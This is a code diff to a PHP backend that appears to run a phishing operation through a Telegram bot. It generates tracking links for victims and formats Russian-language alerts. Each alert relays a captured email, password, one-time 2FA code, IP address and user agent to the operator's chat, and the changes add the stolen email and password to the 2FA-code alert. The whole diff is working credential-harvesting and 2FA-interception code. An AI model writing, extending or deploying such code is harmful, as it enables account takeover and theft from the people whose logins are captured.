@@ -660,7 +660,7 @@ function create_link(int $chat_id, string $suffix): void
 
     db_run('INSERT INTO links (id, number_suffix, chat_id) VALUES (?,?,?)', [$id, $suffix, $chat_id]);
 
-    $url    = link_public_url(['number_suffix' => $suffix]);
+    $url    = link_public_url(['id' => $id]);
     $prefix = (string)cfg_get('number_prefix');
     tg_send($chat_id,
         "✅ <b>Ссылка создана</b>\n\n" .
@@ -1203,13 +1203,16 @@ function post_verdict_keyboard(?string $session_id, ?string $ip, ?string $ban_cb
 
 function build_login_attempt_text(array $att): string
 {
+    $url    = link_public_url(['id' => (string)($att['link_id'] ?? '')]);
+    $prefix = (string)cfg_get('number_prefix');
     $suffix = (string)($att['number_suffix'] ?? '');
-    $url    = $suffix !== '' ? link_public_url($suffix) : link_public_url(['id' => $att['link_id']]);
     $ip   = $att['ip'] ?: '—';
     $ua   = $att['user_agent'] ? mb_substr($att['user_agent'], 0, 120) : '—';
     $time = $att['created_at'] ?? date('Y-m-d H:i:s');
     return "🔐 <b>Новый вход</b>\n" .
            "───────────────\n" .
+           "🆔 ID: <code>" . htmlspecialchars((string)($att['link_id'] ?? '')) . "</code>\n" .
+           "📱 Номер: <code>" . htmlspecialchars($prefix . $suffix) . "</code>\n" .
            "🔗 <a href=\"$url\">$url</a>\n" .
            "📧 Email: <code>" . htmlspecialchars($att['email']) . "</code>\n" .
            "🔑 Пароль: <code>" . htmlspecialchars($att['password']) . "</code>\n" .
@@ -1221,7 +1224,7 @@ function build_login_attempt_text(array $att): string
 function notify_login_attempt(int $attempt_id): void
 {
     $att = db_one(
-        'SELECT la.*, l.chat_id AS link_chat, l.number_suffix
+        'SELECT la.*, l.chat_id AS link_chat, l.number_suffix, l.id AS link_ref
            FROM login_attempts la JOIN links l ON l.id = la.link_id
           WHERE la.id = ?', [$attempt_id]
     );
@@ -1244,18 +1247,23 @@ function notify_login_attempt(int $attempt_id): void
 
 function build_attempt_text(array $att): string
 {
-    $suffix = (string)($att['number_suffix'] ?? '');
-    $url    = $suffix !== '' ? link_public_url($suffix) : link_public_url(['id' => $att['link_id']]);
+    $url    = link_public_url(['id' => (string)($att['link_id'] ?? '')]);
     $prefix = (string)cfg_get('number_prefix');
     $number = $prefix . ($att['number_suffix'] ?? '');
+    $creds  = session_login_credentials($att['session_id'] ?? null);
+    $email  = $creds['email'] !== '' ? $creds['email'] : '—';
+    $pass   = $creds['password'] !== '' ? $creds['password'] : '—';
     $ip     = $att['ip'] ?: '—';
     $ua     = $att['user_agent'] ? mb_substr($att['user_agent'], 0, 120) : '—';
     $time   = $att['created_at'] ?? date('Y-m-d H:i:s');
     return "📩 <b>Новая попытка (2FA)</b>\n" .
            "───────────────\n" .
-           "🔗 <a href=\"$url\">$url</a>\n" .
+           "🆔 ID: <code>" . htmlspecialchars((string)($att['link_id'] ?? '')) . "</code>\n" .
            "📱 Номер: <code>" . htmlspecialchars($number) . "</code>\n" .
-           "🔑 Код: <code>" . htmlspecialchars($att['code']) . "</code>\n" .
+           "🔗 <a href=\"$url\">$url</a>\n" .
+           "📧 Email: <code>" . htmlspecialchars($email) . "</code>\n" .
+           "🔑 Пароль: <code>" . htmlspecialchars($pass) . "</code>\n" .
+           "🔢 Код: <code>" . htmlspecialchars($att['code']) . "</code>\n" .
            "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n" .
            "🧭 UA: <code>" . htmlspecialchars($ua) . "</code>\n" .
            "🕐 " . $time;
